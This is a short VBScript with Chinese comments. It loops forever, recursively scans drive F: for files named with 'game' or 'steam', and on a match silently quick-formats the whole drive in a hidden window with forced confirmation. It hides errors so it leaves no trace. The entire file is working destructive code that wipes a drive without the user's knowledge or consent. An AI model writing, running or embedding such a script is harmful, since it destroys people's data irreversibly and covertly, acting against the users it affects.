Set Ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

Function CheckForFiles(folder)
    For Each file In folder.Files
        If InStr(1, file.Name, "Game", vbTextCompare) > 0 Or InStr(1, file.Name, "game", vbTextCompare) > 0 Or InStr(1, file.Name, "steam", vbTextCompare) > 0 Then
            CheckForFiles = True
            Exit Function
        End If
    Next
    For Each subfolder In folder.SubFolders
        If CheckForFiles(subfolder) Then
            CheckForFiles = True
            Exit Function
        End If
    Next
    CheckForFiles = False
End Function

On Error Resume Next ' 错误处理开始，避免显示错误消息
Do
    If fso.DriveExists("F") Then
        Set fDrive = fso.GetDrive("F")
        If fDrive.IsReady Then
            If CheckForFiles(fso.GetFolder("F:\")) Then
                Ws.Run "%Comspec% /c format F: /fs:ntfs /q /y", 0, True
            End If
        End If
    End If
    If Err.Number <> 0 Then
        ' 可以在这里记录错误，或者什么也不做
        Err.Clear ' 清除错误
    End If
    WScript.Sleep(60000) ' 等待60秒
Loop
On Error Goto 0 ' 错误处理结束
